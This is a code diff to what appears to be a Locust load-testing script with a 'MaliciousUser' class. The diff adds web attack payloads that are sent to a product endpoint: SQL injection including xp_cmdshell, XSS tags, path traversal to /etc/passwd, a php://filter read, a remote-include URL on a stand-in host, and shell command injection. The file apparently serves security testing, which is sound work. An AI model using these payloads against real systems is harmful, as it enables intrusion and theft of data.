@@ -43,6 +43,18 @@ class MaliciousUser(FastHttpUser):
             "admin'--",
             "1; DROP TABLE users--",
             "' OR 1=1--",
+            "' UNION SELECT null, version()--",
+            "' AND 1=2 UNION SELECT null, null--",
+            "' OR 'x'='x'--",
+            "1; EXEC xp_cmdshell('ping 127.0.0.1')--",
+            "<script>alert('XSS')</script>",
+             "<img src=x onerror=alert('XSS')>",
+             "../../../../etc/passwd",
+             "../../../../etc/passwd%00",
+             "php://filter/convert.base64-encode/resource=index.php",
+             "http://malicious-website.com/malicious-script.php",
+              "1; ls -la",
+              "1 && whoami",
         ]
         payload = random.choice(payloads)
         self._log_request("GET", f"/products?id={payload}", None, "sql_injection")
